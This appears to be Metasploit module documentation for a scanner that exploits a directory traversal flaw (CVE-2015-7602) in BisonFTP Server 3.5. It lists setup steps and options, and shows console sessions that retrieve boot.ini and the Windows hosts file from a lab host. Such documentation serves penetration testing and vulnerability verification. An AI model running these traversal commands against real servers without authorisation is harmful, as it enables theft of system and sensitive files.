## Vulnerable Application

This module exploits a directory traversal vulnerability in BisonWare BisonFTP Server
version 3.5. The flaw allows an attacker to download arbitrary files from the server by
sending a crafted `RETR` command using traversal strings such as `..//`.

The vulnerability is tracked as [CVE-2015-7602](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7602).

### Setup

1. Download BisonWare BisonFTP Server 3.5 from [Exploit-DB (EDB-38341)](https://www.exploit-db.com/exploits/38341).
2. Install and run it on a Windows host.
3. Configure the FTP root directory and ensure the service is listening (default port 21).
4. Set up an anonymous login or create a user account with credentials.

## Verification Steps

1. Start msfconsole
2. Do: `use auxiliary/scanner/ftp/bison_ftp_traversal`
3. Do: `set RHOSTS [target IP]`
4. Do: `run`
5. You should see the requested file contents stored as loot.

## Options

### DEPTH

The number of traversal sequences (`..//`) to prepend to the file path. The default is `32`.
A high value is used because the exact depth of the FTP root can vary.

### PATH

The path to the file to retrieve from the target, relative to the drive root. The default value
is `boot.ini`. For example, to read the Windows hosts file, set this to
`windows/system32/drivers/etc/hosts`.

### FTPUSER

The FTP username to authenticate with. Default is `anonymous`.

### FTPPASS

The FTP password to authenticate with. Default is `mozilla@example.com`.

## Scenarios

### BisonFTP 3.5 on Windows XP

```
msf > use auxiliary/scanner/ftp/bison_ftp_traversal
msf auxiliary(scanner/ftp/bison_ftp_traversal) > set RHOSTS 192.168.1.10
RHOSTS => 192.168.1.10
msf auxiliary(scanner/ftp/bison_ftp_traversal) > set PATH boot.ini
PATH => boot.ini
msf auxiliary(scanner/ftp/bison_ftp_traversal) > run

[+] Stored boot.ini to /root/.msf4/loot/20250319120000_default_192.168.1.10_bisonware.ftp.da_123456.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Reading the hosts file

```
msf > use auxiliary/scanner/ftp/bison_ftp_traversal
msf auxiliary(scanner/ftp/bison_ftp_traversal) > set RHOSTS 192.168.1.10
RHOSTS => 192.168.1.10
msf auxiliary(scanner/ftp/bison_ftp_traversal) > set PATH windows/system32/drivers/etc/hosts
PATH => windows/system32/drivers/etc/hosts
msf auxiliary(scanner/ftp/bison_ftp_traversal) > set VERBOSE true
VERBOSE => true
msf auxiliary(scanner/ftp/bison_ftp_traversal) > run

[*] Data returned:
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.

[+] Stored windows/system32/drivers/etc/hosts to /root/.msf4/loot/20250319120000_default_192.168.1.10_bisonware.ftp.da_654321.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

